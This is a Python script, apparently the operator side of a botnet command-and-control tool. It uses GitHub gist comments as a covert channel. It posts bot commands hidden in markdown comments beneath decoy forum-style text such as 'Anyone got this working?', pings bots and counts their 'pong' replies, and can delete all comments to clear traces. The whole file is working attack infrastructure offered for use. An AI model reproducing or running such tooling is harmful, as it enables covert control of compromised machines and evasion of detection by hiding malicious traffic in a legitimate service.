#! /bin/python3
import argparse
import sys
import threading
import time
import requests
from dotenv import dotenv_values
from utils import create_markdown_comment, get_comment_text, get_markdown_timestamp, get_random_message, parse_markdown_comment

parser = argparse.ArgumentParser(
    prog='controller.py',
    description='Bot controller script, connect to given gist channel and send commands',
    usage="""
    "post": create comment with text and bot command - this wil create a comment and use it for all subsequent commands
    "command": submit a bot command - this wil use last command comment or create a new one with random message 
    "commands": show commands and responses
    "bots": show active bot count
    "comments": show gist comments
    "exit": quit application
    """
)

try:
    github_token = dotenv_values(".env")['GITHUB_TOKEN']
except KeyError:
    github_token = None

parser.add_argument('gistId', help="Github gist id")
parser.add_argument(
    '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)
parser.add_argument('-d', '--delete', help="Delete all comments",
                    action='store_true')

args = parser.parse_args()

if (github_token is None or args.token is not None):
    github_token = args.token

gist_id = args.gistId
gist_url = f'https://api.github.com/gists/{gist_id}'
comments_url = f'{gist_url}/comments'

headers = {"authorization": f'bearer {github_token}'}
gist_response = requests.get(gist_url, headers=headers)
gist = gist_response.json()
state = {"last_update": gist['updated_at'],
         "bot_count": 'checking...', "command_comment": None, "ping_comment": None, "command_text": None, "ping_text": None}

try:
    print(f"Channel url: {gist['url']}")
except KeyError:
    print(f'Failed tof fetch gist: {gist_response}')
    exit()


def get_comments(latest_only=False):
    comments = requests.get(comments_url, headers=headers).json()
    comments.sort(
        key=lambda comment: comment['updated_at'])

    if latest_only:
        comments = list(filter(
            lambda comment: comment['updated_at'] > state['last_update'], comments))
    return comments


def print_comments(latest_only=False, commands_only=False):
    comments = get_comments(latest_only=latest_only)

    comment_cards = map(lambda comment: f"""
    {comment['updated_at']}: {comment['user']['login']}[{comment['user']['id']}]> "{parse_markdown_comment(comment['body']) if commands_only else comment['body']}" """, comments)

    for card in comment_cards:
        print(card)


def post_comment(message):
    response = requests.post(
        comments_url, json={"body": message}, headers=headers)

    return response


def post_command(command):
    def get_message():
        state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
        return f"{state['command_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
    command_comment = state['command_comment']

    if command_comment is None:
        response = post_comment(get_message())
        state['command_comment'] = response.json()
        return response

    response = requests.get(
        f'{comments_url}/{command_comment["id"]}', headers=headers)

    if (response.status_code == 404):
        state['command_comment'] = None
        return post_command(command)

    update_comment(
        comment_id=command_comment['id'], message=get_message())
    return response


def update_comment(comment_id, message):
    response = requests.patch(
        f'{comments_url}/{comment_id}', json={"body": message}, headers=headers)
    return response


def delete_comment(comment_id: str):
    return requests.delete(
        f'{comments_url}/{comment_id}', headers=headers)


def prompt(message="$ "):
    sys.stdout.write(message)
    sys.stdout.flush()
    return sys.stdin.readline().strip()


def ping_bots():
    def get_message():
        state['ping_text'] = state['ping_text'] if state['ping_text'] is not None else get_random_message(
            ['Anyone got this working?', 'Is this up to date?'])

        return f"{state['ping_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment('ping')}"

    while True:
        try:
            # Wait for bots to respond
            time.sleep(8)

            ping_comment = state['ping_comment']
            comments = get_comments()
            comments = filter(
                lambda comment: comment['updated_at'] > ping_comment['updated_at'], comments)
            commands = map(lambda comment: (
                parse_markdown_comment(comment['body'])), comments)
            bot_count = len(
                list(filter(lambda command: command == 'pong', list(commands))))
            state['bot_count'] = bot_count
            state['ping_comment'] = update_comment(
                comment_id=ping_comment['id'], message=get_message()).json()
        except (KeyError, TypeError):
            # No ping comment
            state['ping_comment'] = post_comment(get_message()).json()


def delete_comments():
    comments = get_comments()
    for text in comments:
        print(f"deleting {text['id']}")
        response = delete_comment(text['id'])
        print(response)


if args.delete:
    delete_comments()

threading.Thread(
    target=ping_bots, daemon=True).start()

while True:
    if state['command_comment'] is not None:
        state['last_update'] = state['command_comment']['updated_at']
    command = prompt(f"[bots: {state['bot_count']}] $ ")
    match command:
        case 'comments':
            print('> fetching comments')
            print_comments()
        case 'commands':
            print('> fetching commands')
            print_comments(commands_only=True)

        case 'latest':
            print('> fetching latest commands')
            print_comments(latest_only=True, commands_only=True)

        case 'post':
            text = prompt("> Write comment: ")
            command = prompt("> Submit command: ")
            response = post_comment(
                f'{text}\n\n{create_markdown_comment(command)}')
            state['command_comment'] = response.json()
            state['command_text'] = text
            print(response)

        case 'command':
            command = prompt("> Submit command: ")
            response = post_command(command)
            print(response)

        case 'bots':
            print(f'> bot count: {state["bot_count"]}')

        case 'clear':
            delete_comments()
        case 'exit':
            break
        case other:
            print('> Unknown command: ' + command)
